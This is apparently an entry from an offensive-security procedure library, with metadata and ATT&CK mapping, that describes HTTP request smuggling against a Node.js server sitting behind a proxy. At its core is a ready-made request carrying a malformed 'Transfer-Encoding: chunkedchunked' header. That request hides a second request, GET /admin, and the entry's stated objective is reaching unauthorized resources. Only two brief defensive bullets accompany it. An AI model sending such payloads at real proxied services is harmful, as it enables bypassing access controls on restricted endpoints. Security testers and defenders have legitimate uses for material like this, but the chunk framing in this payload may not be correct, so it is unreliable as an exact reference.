---
tags:
  - http-request-smuggling
  - proxy-desync
  - exploitation
type: procedure
tools:
  - '[[tools/Node-js]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/http-get-smuggling-payload]]'
platforms:
  - Web
  - Node.js
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 06a6c740-ae50-4b81-96d4-bafa062b469e
created_at: '2025-12-13T09:01:17.320Z'
updated_at: '2025-12-13T09:01:17.320Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Demonstrate HTTP Request Smuggling in Proxy-Backend Scenario

## Summary

This procedure demonstrates HTTP Request Smuggling by sending a payload that causes desynchronization between a proxy and the Node.js backend, allowing smuggled requests to be processed.

## Description

The crafted request uses the malformed Transfer-Encoding to trick the Node.js server into parsing a chunked body that includes additional requests, while a proxy might ignore the invalid header. This can lead to accessing restricted endpoints like /admin. Assumes a proxy-backend setup.

## Requirements

1. Node.js server running behind a proxy
2. Ability to send requests through the proxy
3. Understanding of HTTP smuggling techniques

## Defense

Defensive measures and detection strategies:

- Ensure consistent parsing between proxy and backend
- Deploy WAF rules to block malformed Transfer-Encoding

## Objectives

1. Achieve request smuggling
2. Access unauthorized resources
3. Illustrate real-world impact

## Instructions

### Step 1: Send Smuggling Payload

**Context**: This step sends the payload to exploit desynchronization.

**Command** ([[commands/http-get-smuggling-payload]]):
```http
GET / HTTP/1.1
Host: localhost
Transfer-Encoding: chunkedchunked

26
GET / HTTP/1.1
Host: localhost
Content-Length: 30

0

GET /admin HTTP/1.1


```

> This encapsulates a smuggled GET /admin request. Expected output: Backend processes the smuggled request.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/http-get-smuggling-payload]]

## Tools Used

- [[tools/Node-js]]

## Tags

- [[http-request-smuggling]]
- [[proxy-desync]]
